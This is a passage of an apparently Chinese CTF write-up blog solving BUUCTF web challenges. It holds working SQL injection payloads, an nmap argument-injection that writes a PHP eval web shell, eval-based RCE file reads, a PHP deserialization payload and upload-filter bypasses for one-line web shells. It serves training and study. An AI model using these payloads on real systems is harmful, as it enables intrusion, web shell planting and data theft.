<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0<span class="string">';set @sql=concat('</span>selec<span class="string">','</span>t * from `1919810931114514`;<span class="string">');prepare stmt_name from @sql;execute stmt_name --+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easysql2.jpg" alt=""><br>过滤了set和prepare,但是strstr()函数对大小写不敏感<br>payload</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0<span class="string">';Set @sql=concat('</span>selec<span class="string">','</span>t * from `1919810931114514`;<span class="string">');Prepare stmt_name from @sql;execute stmt_name --+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easysql3.jpg" alt=""></p>
<h3 id="SUCTF-2019-EasySQL-堆叠注入"><a href="#SUCTF-2019-EasySQL-堆叠注入" class="headerlink" title="[SUCTF 2019]EasySQL(堆叠注入)"></a>[SUCTF 2019]EasySQL(堆叠注入)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1               //返回Array ( [0] =&gt; 1 )</span><br><span class="line">1<span class="string">'              //无返回</span></span><br><span class="line"><span class="string">1'</span> or <span class="string">'1'</span>=<span class="string">'1    //返回Nonono.</span></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Easysql/Easysql0.jpg" alt=""><br>使用堆叠注入爆一下表</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1;show tables;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Easysql/Easysql1.png" alt=""><br>大佬说官方给出的查询代码是</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select <span class="variable">$post</span>[<span class="string">'query'</span>]||flag from Flag</span><br></pre></td></tr></table></figure>
<p>这里就是要想办法让||的作用不再是逻辑或，而是连接符<br>官方payload</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1;<span class="built_in">set</span> sql_mode=PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>
<p>在oracle中缺省支持通过’||’来实现字符串拼接，但在mysql中缺省不支持，需要调整mysql 的sql_mode<br>模式：pipes_as_concat 来实现oracle 的一些功能<br>拼接一下就是</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select 1;<span class="built_in">set</span> sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</span><br></pre></td></tr></table></figure>
<p>sql_mode:它定义了MySQL应支持的SQL语法，以及应该在数据上做何种确认检查，其中的PIPES_AS_CONCAT会将||当作字符串的连接操作符，在该模式下进行查询时，使用字母连接会报错，只有使用数字连接才能够查询成功.这里select 1||flag from Flag相当于执行了select 1和select flag from Flag这两个查询操作<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Easysql/Easysql2.png" alt=""></p>
<h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>测试万能密码，直接就登陆进去了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql0.jpg" alt=""><br>使用给出的密码登陆，接下来进行注入点测试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=admin<span class="string">'&amp;password=123</span></span><br></pre></td></tr></table></figure>
<p>单引号注入，order by爆字段数,最终字段为4时报错，说明字段数为3</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=admin<span class="string">' order by 3%23&amp;password=123</span></span><br></pre></td></tr></table></figure>
<p>判断注入字段</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=0<span class="string">' union select 1,2,3%23&amp;password=123</span></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql1.jpg" alt=""><br>回显点为2，3<br>爆数据库名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=0<span class="string">' union select 1,2,database()%23&amp;password=123</span></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql2.jpg" alt=""><br>数据库名为geek,爆表名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=0<span class="string">' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=123</span></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql3.jpg" alt=""><br>得到表名：geekuser,l0ve1ysq1<br>爆字段</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=0<span class="string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>geekuser<span class="string">'%23&amp;password=123</span></span><br><span class="line"><span class="string">?username=0'</span> union select 1,2,group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">'l0ve1ysq1'</span>%23&amp;password=123</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql4.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql5.jpg" alt=""></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=0<span class="string">' union select 1,2,group_concat(id,0x3a,username,0x3a,password) from geekuser%23&amp;password=123</span></span><br><span class="line"><span class="string">?username=0'</span> union select 1,2,group_concat(id,0x3a,username,0x3a,password) from l0ve1ysq1%23&amp;password=123</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql6.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql7.jpg" alt=""></p>
<h3 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/hacker/hacker0.jpg" alt=""><br>下载后打开<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/hacker/hacker1.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/hacker/hacker2.jpg" alt=""><br>很多这种PHP文件,从其中的内容可以看出是一句话木马，但是很多都是混淆视听的，很明显被置空了，这道题就是要编写脚本来找出真正有效的一句话木马</p>
<h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">'REMOTE_ADDR'</span>] = <span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_GET</span>[<span class="string">'host'</span>])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">'host'</span>];</span><br><span class="line">    <span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = md5(<span class="string">"glzjin"</span>. <span class="variable">$_SERVER</span>[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'you are in sandbox '</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="built_in">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="built_in">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看见system函数，应该是RCE<br>escapeshellarg():<a href="https://www.php.net/manual/zh/function.escapeshellarg.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.escapeshellarg.php</a><br>escapeshellcmd():<a href="https://www.php.net/manual/zh/function.escapeshellcmd.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.escapeshellcmd.php</a><br>这两个函数连用就会形成注入,漏洞介绍及利用方法：<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">https://paper.seebug.org/164/</a><br>这里还有一个关键点就是nmap命令:<a href="https://www.cnblogs.com/liaopeng123/p/11281516.html" target="_blank" rel="noopener">https://www.cnblogs.com/liaopeng123/p/11281516.html</a><br>其中-oG命令就是这里的利用点</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-oG test.php    //将扫描结果写入test.php</span><br></pre></td></tr></table></figure>
<p>由以上两点可构造payload</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?host=<span class="string">' &lt;?php @eval($_POST["pass"]); ?&gt; -oG test.php '</span></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/OnlineTool/onlineTool0.jpg" alt=""><br>拿到目录，去访问一下test.php<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/OnlineTool/onlineTool1.jpg" alt=""><br>蚁剑直接连，里面发现flag文件</p>
<h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/EasyCalc/calc0.jpg" alt=""><br>查看源码<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/EasyCalc/calc1.jpg" alt=""><br>看来需要绕WAF，源码中发现了calc.php</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_GET</span>[<span class="string">'num'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">'num'</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\'</span><span class="string">', '</span><span class="string">"', '`', '\[', '\]','\$','\\','\^'];</span></span><br><span class="line"><span class="string">        foreach (<span class="variable">$blacklist</span> as <span class="variable">$blackitem</span>) </span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">                if (preg_match('/' . <span class="variable">$blackitem</span> . '/m', <span class="variable">$str</span>)) </span></span><br><span class="line"><span class="string">                &#123;</span></span><br><span class="line"><span class="string">                        die("</span>what are you want to <span class="keyword">do</span>?<span class="string">");</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        eval('echo '.<span class="variable">$str</span>.';');</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>看到eval函数，就知道是RCE了<br>这里需要传入num参数，且对num参数进行了过滤<br>第一步绕过WAF,这里利用的是PHP的解析规则，即php从请求的url中取出变量时，如果变量前面有空格，会去掉前面的空格再解析<br>这里WAF只对’num’进行了过滤，如果是’ num’WAF就失效了，当php解析时’ num’就会被处理成’num’.<br>接下来就是扫一下目录，但是过滤了’/‘,可用chr()来代替</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">? num=123;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/EasyCalc/calc2.jpg" alt=""><br>读取文件内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">? num=123;var_dump(file_get_contents(chr(47).f1agg))</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/EasyCalc/calc3.jpg" alt=""></p>
<h3 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/buyflag/buyflag0.jpg" alt=""><br>查看源码<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/buyflag/buyflag1.jpg" alt=""><br>这里要求参数password不能为数字，同时还要满足password==404，弱类型比较.money还要大于100000000</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">password=404abc&amp;money=100000001</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/buyflag/buyflag2.jpg" alt=""><br>啥也没有，会发现Cookie的值有问题，修改成1<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/buyflag/buyflag3.jpg" alt=""><br>money的值太长了，这里可以利用科学计数法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">password=404abc&amp;money=2e8</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/buyflag/buyflag4.jpg" alt=""></p>
<h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql1.jpg" alt=""><br>万能密码登陆成功<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql2.jpg" alt=""><br>在username处有注入点，是单字符注入，爆字段数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=admin%27 order by 1%23&amp;password=123</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql0.jpg" alt=""><br>发现对or、by进行了过滤，双写绕过</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=admin%27 oorrder bbyy 1%23&amp;password=123</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql3.jpg" alt=""><br>成功绕过，爆出字段数为3，测试注入点</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=1%27 union select 1,2,3%23&amp;password=123</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql4.jpg" alt=""><br>发现对union、select进行了过滤，双写绕过</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=1%27 uunionnion sselectelect 1,2,3%23&amp;password=123</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql5.jpg" alt=""><br>注入点为2，3,爆库名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=1%27 uunionnion sselectelect 1,database(),version()%23&amp;password=123</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql6.jpg" alt=""><br>当前数据库为geek,爆表名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=1%27 uunionnion sselectelect 1,database(),group_concat(schema_name) from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">"geek"</span>%23&amp;password=123</span><br></pre></td></tr></table></figure>
<p>发现from、information、where也被过滤了，依然用双写绕过</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=1%27 uunionnion sselectelect 1,database(),group_concat(table_name) ffromrom infoorrmation_schema.tables wwherehere table_schema=<span class="string">"geek"</span>%23&amp;password=123</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql7.jpg" alt=""><br>得到表名为b4bsql、geekuser，爆字段</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=1%27 uunionnion sselectelect 1,database(),group_concat(column_name) ffromrom infoorrmation_schema.columns wwherehere table_name=<span class="string">"b4bsql"</span>%23&amp;password=123</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql8.jpg" alt=""><br>两个表的字段一样，接下来就是找flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=1%27 uunionnion sselectelect 1,database(),group_concat(username,0x3a,password) ffromrom b4bsql %23&amp;password=123</span><br></pre></td></tr></table></figure>
<p>测试发现password被过滤，这里字段password中有or子字符串，双写绕过就行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=1%27 uunionnion sselectelect 1,database(),group_concat(username,0x3a,passwoorrd) ffromrom b4bsql %23&amp;password=123</span><br></pre></td></tr></table></figure>
<p>在b4bsql表中找到flag<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql9.jpg" alt=""></p>
<h3 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(<span class="string">"flag.php"</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line">    protected <span class="variable">$op</span>;</span><br><span class="line">    protected <span class="variable">$filename</span>;</span><br><span class="line">    protected <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>() &#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">"1"</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">process</span></span>() &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable">$this</span>-&gt;<span class="built_in">read</span>();</span><br><span class="line">            <span class="variable">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="keyword">function</span> <span class="function"><span class="title">write</span></span>() &#123;</span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$this</span>-&gt;filename) &amp;&amp; isset(<span class="variable">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="variable">$this</span>-&gt;content) &gt; 100) &#123;</span><br><span class="line">                <span class="variable">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="keyword">function</span> <span class="function"><span class="title">read</span></span>() &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="keyword">function</span> output(<span class="variable">$s</span>) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="variable">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> is_valid(<span class="variable">$s</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= 32 &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= 125))</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line">    <span class="variable">$str</span> = (string)<span class="variable">$_GET</span>[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>目的是要读取出flag.php中的内容<br>有read和write方法，在read方法中，会读取出filename中的内容，显然我们是要想办法调用read方法<br>在construct方法中，调用了process方法，进入process方法，可以看见如果op==”2”就会去调用read方法，但是在destruct方法中会判断op===”2”,如果成立就会替换为op=”1”,继续调用process时就不能调用read方法了,很明显在destruct中是强类型比较，在process中是弱类型比较，只要使op=2即可绕过destruct方法<br>还有一个函数is_valid,判断是不是可见字符，因为题目中类的成员是protected<br>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上 \0*\0 的前缀，这里的 \0 表示 ASCII 码为 0 的字符，也就是我们经过 urlencode 后看到的 %00 ，所以这无法通过is_valid的过滤<br>这里只需要把protected改为public即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler &#123;</span><br><span class="line">    public <span class="variable">$op</span> = 2;</span><br><span class="line">    public <span class="variable">$filename</span> = <span class="string">"flag.php"</span>;</span><br><span class="line">    public <span class="variable">$content</span> = <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=new FileHandler();</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?str=O:11:<span class="string">"FileHandler"</span>:3:&#123;s:2:<span class="string">"op"</span>;i:2;s:8:<span class="string">"filename"</span>;s:8:<span class="string">"flag.php"</span>;s:7:<span class="string">"content"</span>;s:0:<span class="string">""</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>在源码中就能发现flag</p>
<h3 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h3><p>尝试上传包含<?php @eval($_POST["shell"]);?>的php文件，失败。修改后缀还是不行，burp抓包，修改一下MIME类型image/jpeg，还是不行，继续换后缀，发现phtml时返回了新信息<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Upload/upload0.jpg" alt=""><br>说明对文件内容进行了过滤，那就不能用php标签了，换成js<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Upload/upload1.jpg" alt=""><br>上传成功，蚁剑getshell<br>连上后在文件里发现php7、phps等后缀文件均可getshell,师傅们太强了<br>文件太多，不一一寻找flag,直接终端cat /flag</p>
<h3 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h3><p>直接用上一个题的imageUpload.phtml文件上传，成功上传，返回了路径，直接getshell<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ACTF_Upload/upload_0.jpg" alt=""></p>
<h3 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h3><p>提示说cve-2020-7066，另一篇文章讲了该漏洞<a href="https://zxfireworks.xyz/2020/07/07/CVE-2020-7066/" target="_blank" rel="noopener">https://zxfireworks.xyz/2020/07/07/CVE-2020-7066/</a><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/CVE-2020-7066/cve20207066_0.jpg" alt=""><br>点进去后，URL很特别，其他啥也没有<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/CVE-2020-7066/cve20207066_1.jpg" alt=""><br>用bp抓一下包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/CVE-2020-7066/cve20207066_2.jpg" alt=""><br>提示使用localhost,刚开始还以为是修改X-Forwarded-For呢,测试了一下并不是，那就应该是修改URL中那个特别的参数<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/CVE-2020-7066/cve20207066_3.jpg" alt=""><br>又出现了新提示，Host必须以123结尾，将刚才的url=<a href="http://127.0.0.1修改为url=http://127.0.0.123,并没有什么反应" target="_blank" rel="noopener">http://127.0.0.1修改为url=http://127.0.0.123,并没有什么反应</a><br>文章开头说了，这个题目给了提示，而且在页面中有句话：You just view *.ctfhub.com<br>那是不是要求URL解析后只能为127.0.0.123，且还要get传参中的url是.ctfhub.com结尾，那这就可以利用该漏洞了<br>Payload:?url=<a href="http://127.0.0.123%00www.ctfhub.com">http://127.0.0.123%00www.ctfhub.com</a><br>这里没用\0是因为这是已经解析过了的<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/CVE-2020-7066/cve20207066_4.jpg" alt=""></p>
<h3 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class ClassName</span><br><span class="line">&#123;</span><br><span class="line">        public <span class="variable">$code</span> = null;</span><br><span class="line">        public <span class="variable">$decode</span> = null;</span><br><span class="line">        <span class="keyword">function</span> __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="variable">$this</span>-&gt;code = @<span class="variable">$this</span>-&gt;x()[<span class="string">'Ginkgo'</span>];</span><br><span class="line">                <span class="variable">$this</span>-&gt;decode = @base64_decode( <span class="variable">$this</span>-&gt;code );</span><br><span class="line">                @Eval(<span class="variable">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line">        public <span class="keyword">function</span> x()</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">return</span> <span class="variable">$_REQUEST</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">new ClassName();</span><br></pre></td></tr></table></figure>
